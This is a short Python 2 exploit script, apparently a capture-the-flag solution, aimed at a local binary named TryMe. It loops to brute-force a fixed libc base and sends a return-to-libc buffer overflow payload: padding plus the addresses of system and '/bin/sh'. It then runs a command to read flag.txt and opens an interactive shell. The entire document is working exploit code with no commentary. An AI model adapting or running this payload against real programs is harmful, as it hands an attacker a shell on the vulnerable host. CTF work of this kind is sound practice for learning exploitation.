#!/usr/bin/env python
# -*- coding: utf-8 -*-

from zio import *
import os

idx = 0
while True:
    try:
        ID = os.popen("./getID").read().strip()
        print "ID -> {}".format(ID)
        
        libcbase = 0xf7dc9000
        system = 0x3cd10
        binsh = 0x17b988
        payload = '0' * 412 + l32(libcbase + system) + 'aaaa' + l32(libcbase + binsh)
        #  with open("./payload", "w") as f:
            #  f.write(payload)
        target = "./TryMe {} {}".format(ID, payload)

        print idx
        idx += 1
        io = zio(target)
        
        io.writeline("/bin/cat ./flag.txt")
        io.interact()
        break
    except:
        io.close()
